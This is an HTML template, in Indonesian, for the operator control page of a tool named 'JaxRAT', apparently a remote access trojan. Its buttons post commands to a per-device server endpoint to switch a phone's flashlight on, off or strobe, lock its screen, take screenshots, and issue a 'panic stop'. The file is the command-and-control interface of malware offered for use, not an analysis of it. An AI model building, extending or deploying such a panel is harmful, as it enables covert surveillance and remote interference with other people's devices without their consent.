<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JaxRAT - Kontrol</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: monospace; text-align: center; padding: 20px; }
        h1 { text-shadow: 0 0 10px #00ff00; }
        .btn { background-color: #000; color: #00ff00; border: 2px solid #00ff00; padding: 15px 20px; margin: 5px; font-size: 16px; cursor: pointer; }
        .btn:hover { background-color: #00ff00; color: #000; }
        #status-box { margin: 20px 0; padding: 10px; border: 1px dashed #00ff00; font-weight: bold; }
        .btn-panic { border-color: red; color: red; font-weight: bold; }
        .btn-panic:hover { background-color: red; color: black; }
    </style>
</head>
<body>
    <h1>[ KONTROL: {{ device.name }} ]</h1>
    
    <div id="status-box">Menunggu perintah...</div>

    <button class="btn btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 PANIC STOP 🚨</button><br><br>

    <button class="btn" onclick="kirimPerintah('flash_on')">💡 NYALA</button>
    <button class="btn" onclick="kirimPerintah('flash_off')">🔌 MATI</button>
    <button class="btn" onclick="kirimPerintah('flash_strobe')">⚡ KELAP-KELIP</button><br><br>

    <button class="btn" onclick="kirimPerintah('lock_device')">📴 KUNCI LAYAR</button>
    <button class="btn" onclick="kirimPerintah('screenshot')">📸 SCREENSHOT</button><br><br>

    <a href="/" class="btn" style="text-decoration: none; display: inline-block;">← Kembali</a>

    <script>
        const deviceId = "{{ device_id }}";
        const statusBox = document.getElementById('status-box');

        function kirimPerintah(cmd) {
            statusBox.innerText = "Mengirim...";
            
            fetch('/api/command/' + deviceId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            })
            .then(res => res.json())
            .then(data => {
                statusBox.innerText = "✅ Terkirim: " + cmd;
            })
            .catch(err => {
                statusBox.innerText = "❌ Gagal konek ke server!";
            });
        }
    </script>
</body>
</html>
